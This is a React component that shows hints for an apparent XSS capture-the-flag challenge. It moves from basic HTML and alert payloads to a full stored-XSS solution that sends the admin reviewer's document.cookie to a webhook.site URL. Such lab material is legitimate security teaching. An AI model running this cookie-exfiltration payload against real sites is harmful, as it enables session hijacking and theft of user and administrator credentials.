import {
  Card,
  CardContent,
  Typography,
  Chip,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  AccordionGroup,
} from "@mui/joy";

export default function XSSHints() {
  return (
    <Card
      variant="outlined"
      sx={{
        flex: 1,
        maxWidth: 500,
        boxShadow: "lg",
        borderRadius: "lg",
      }}
    >
      <CardContent>
        <Typography
          level="title-md"
          component="div"
          sx={{ mb: 2, display: "flex", alignItems: "center", gap: 1 }}
        >
          <Chip size="sm" color="warning">
            XSS Challenge
          </Chip>
          <span>Hints</span>
        </Typography>
        <AccordionGroup>
          <Accordion>
            <AccordionSummary>
              <Typography level="title-sm">Discovering the Vulnerability</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography level="body-sm">
                The message board renders HTML content directly.
                <br />
                <br />
                Try submitting basic HTML tags:
                <br />• <code>&lt;b&gt;bold&lt;/b&gt;</code>
                <br />• <code>&lt;i&gt;italic&lt;/i&gt;</code>
                <br />• <code>&lt;u&gt;underlined&lt;/u&gt;</code>
              </Typography>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary>
              <Typography level="title-sm">Testing Script Execution</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography level="body-sm">
                Try injecting scripts into the message board.
                <br />
                Anything happens?
                <br />
                <br />
                Alternative approaches:
                <br />• <code>&lt;img src="x" onerror="alert('XSS')"&gt;</code>
                <br />• <code>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code>
              </Typography>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary>
              <Typography level="title-sm">Information Extraction</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography level="body-sm">
                <strong>Goal:</strong> Retrieve sensitive data available during review.
                <br />
                <br />
                <strong>Techniques:</strong>
                <br />• Access cookies: <code>document.cookie</code>
                <br />• Check for special flags in page content
                <br />• Examine localStorage/sessionStorage
                <br />
                <br />
                (The review environment may have special privileges)
              </Typography>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary>
              <Typography level="title-sm">Data Capture</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography level="body-sm">
                You can't see the review process output directly.
                <br />
                <br />
                <strong>Solution:</strong> Send data to an external server:
                <br />• Use webhook services like webhook.site to capture data
                <br />• Redirect the admin's browser to your webhook with cookie data
              </Typography>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary>
              <Typography level="title-sm">Complete Solution</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography level="body-sm">
                <strong>Final Payload:</strong>
                <br />
                <code>
                  {`<script>document.location = "https://webhook.site/your_webhook_id?cookie=" + document.cookie</script>`}
                </code>
                <br />
                <br />
                <strong>Steps:</strong>
                <br />
                1. Go to https://webhook.site and get your unique webhook ID
                <br />
                2. Replace "your_webhook_id" with your actual webhook ID
                <br />
                3. Submit this payload as a message
                <br />
                4. Report the message
                <br />
                5. Check your webhook.site for the admin's cookie data
                <br />
                6. Look for special flags in the captured data
              </Typography>
            </AccordionDetails>
          </Accordion>
        </AccordionGroup>
      </CardContent>
    </Card>
  );
}
